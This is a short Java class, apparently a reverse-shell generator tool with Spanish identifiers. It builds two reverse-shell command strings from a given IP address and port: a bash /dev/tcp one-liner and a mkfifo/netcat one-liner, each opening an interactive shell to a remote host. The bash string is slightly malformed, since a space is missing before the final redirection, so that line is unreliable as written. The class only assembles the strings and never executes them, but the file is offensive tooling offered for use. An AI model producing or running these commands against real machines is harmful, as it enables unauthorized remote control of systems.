package proyecto;

public class shells {
    public int tipoShell;
    private String IP;
    private String port;
    private String shell;

    public shells(int tipoShell, String IP, String port) {
        this.tipoShell = tipoShell;
        this.IP = IP;
        this.port = port;
    }

    public shells(String IP, String port) {
        this.IP = IP;
        this.port = port;
        this.tipoShell = 1;
    }

    public int getTipoShell() {
        return tipoShell;
    }

    public void setTipoShell(int tipoShell) {
        this.tipoShell = tipoShell;
    }

    public String getIP() {
        return IP;
    }

    public void setIP(String IP) {
        this.IP = IP;
    }

    public String getPort() {
        return port;
    }

    public void setPort(String port) {
        this.port = port;
    }

    public void Bash(){
        shell  =  "sh -i >& /dev/tcp/"+IP+"/"+port+"0>&1";
    }

    public void nc(){
        shell = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc " + IP + " " + port + " >/tmp/f";
    }

    public void shellify(){
        switch (tipoShell){
            case 1:
                Bash();
                break;
            case 2:
                nc();
                break;
        }
    }

    @Override
    public String toString() {
        return "shell= \n" + shell;
    }
}